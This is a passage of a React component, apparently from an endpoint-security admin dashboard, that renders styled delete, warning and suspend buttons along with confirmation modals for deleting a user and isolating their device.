              onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'rgba(246, 70, 93, 0.08)')}
            >
              🗑️ Delete User
            </button>

            {/* Action 3: Issue Warning (Mid-Weight Gold/Amber Button) */}
            <button
              onClick={handleIssueWarning}
              style={{
                backgroundColor: 'rgba(252, 213, 53, 0.12)',
                border: '1px solid rgba(252, 213, 53, 0.4)',
                color: '#fcd535',
                padding: '12px 16px',
                borderRadius: '8px',
                fontSize: '13px',
                fontWeight: '800',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                transition: 'all 0.2s ease',
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.22)'
                e.currentTarget.style.transform = 'translateY(-1px)'
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = 'rgba(252, 213, 53, 0.12)'
                e.currentTarget.style.transform = 'translateY(0)'
              }}
            >
              ⚠️ Issue Warning
            </button>

            {/* Action 4: Suspend Access (Strongest Primary Red Button) */}
            <button
              onClick={() => setShowSuspendModal(true)}
              style={{
                background: 'linear-gradient(135deg, #f6465d 0%, #d9384d 100%)',
                color: '#ffffff',
                border: 'none',
                padding: '14px 16px',
                borderRadius: '8px',
                fontSize: '13px',
                fontWeight: '800',
                letterSpacing: '0.5px',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                boxShadow: '0 4px 16px rgba(246, 70, 93, 0.4)',
                transition: 'all 0.2s ease',
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.boxShadow = '0 6px 22px rgba(246, 70, 93, 0.65)'
                e.currentTarget.style.transform = 'translateY(-1px)'
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.boxShadow = '0 4px 16px rgba(246, 70, 93, 0.4)'
                e.currentTarget.style.transform = 'translateY(0)'
              }}
            >
              ⛔ Suspend Access
            </button>
          </div>
        </div>
      </main>

      {/* ------------------------------------------------------------- */}
      {/* 3. CONFIRMATION MODALS FOR DESTRUCTIVE ACTIONS               */}
      {/* ------------------------------------------------------------- */}
      
      {/* Delete User Confirmation Modal */}
      {showDeleteModal && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            backgroundColor: 'rgba(0, 0, 0, 0.85)',
            backdropFilter: 'blur(8px)',
            zIndex: 2000,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            animation: 'fadeIn 0.2s ease',
          }}
          onClick={() => setShowDeleteModal(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%',
              maxWidth: '440px',
              backgroundColor: 'var(--colors-surface-card-dark)',
              border: '1px solid rgba(246, 70, 93, 0.4)',
              borderRadius: '16px',
              padding: '28px',
              boxShadow: '0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(246, 70, 93, 0.2)',
            }}
          >
            <h3 style={{ margin: '0 0 12px 0', fontSize: '18px', color: '#ffffff', fontWeight: '800' }}>
              🗑️ Confirm User Deletion
            </h3>
            <p style={{ margin: '0 0 24px 0', fontSize: '13px', color: '#cbd5e1', lineHeight: 1.5 }}>
              Are you sure you want to delete user <strong>{userName}</strong> and purge their enrolled endpoint telemetry history from <strong>{currentOrg.name}</strong>?
            </p>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
              <button
                onClick={() => setShowDeleteModal(false)}
                style={{
                  backgroundColor: 'var(--colors-surface-card-dark)',
                  border: '1px solid var(--colors-hairline-on-dark)',
                  color: '#cbd5e1',
                  padding: '8px 16px',
                  borderRadius: '8px',
                  fontSize: '13px',
                  fontWeight: '700',
                  cursor: 'pointer',
                }}
              >
                Cancel
              </button>
              <button
                onClick={handleConfirmDelete}
                style={{
                  backgroundColor: '#f6465d',
                  color: '#ffffff',
                  border: 'none',
                  padding: '8px 18px',
                  borderRadius: '8px',
                  fontSize: '13px',
                  fontWeight: '800',
                  cursor: 'pointer',
                }}
              >
                Confirm Delete
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Suspend Access Confirmation Modal */}
      {showSuspendModal && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            backgroundColor: 'rgba(0, 0, 0, 0.85)',
            backdropFilter: 'blur(8px)',
            zIndex: 2000,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            animation: 'fadeIn 0.2s ease',
          }}
          onClick={() => setShowSuspendModal(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%',
              maxWidth: '440px',
              backgroundColor: 'var(--colors-surface-card-dark)',
              border: '1px solid rgba(246, 70, 93, 0.5)',
              borderRadius: '16px',
              padding: '28px',
              boxShadow: '0 20px 50px rgba(0, 0, 0, 0.8), 0 0 25px rgba(246, 70, 93, 0.3)',
            }}
          >
            <h3 style={{ margin: '0 0 12px 0', fontSize: '18px', color: '#ffffff', fontWeight: '800' }}>
              ⛔ Confirm Access Suspension
            </h3>
            <p style={{ margin: '0 0 24px 0', fontSize: '13px', color: '#cbd5e1', lineHeight: 1.5 }}>
              Are you sure you want to suspend endpoint access and revoke API authorization for <strong>{userName}</strong>? This will immediately isolate the host device.
            </p>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
              <button
                onClick={() => setShowSuspendModal(false)}
                style={{
                  backgroundColor: 'var(--colors-surface-card-dark)',
                  border: '1px solid var(--colors-hairline-on-dark)',
                  color: '#cbd5e1',
                  padding: '8px 16px',
                  borderRadius: '8px',
                  fontSize: '13px',
                  fontWeight: '700',
                  cursor: 'pointer',
                }}
              >
                Cancel
              </button>
              <button
                onClick={handleConfirmSuspend}
                style={{
                  background: 'linear-gradient(135deg, #f6465d 0%, #d9384d 100%)',
                  color: '#ffffff',
                  border: 'none',
                  padding: '8px 18px',
                  borderRadius: '8px',
                  fontSize: '13px',
                  fontWeight: '800',
                  cursor: 'pointer',
                }}
              >
                Confirm Suspend
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(-4px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>
    </div>
  )
}
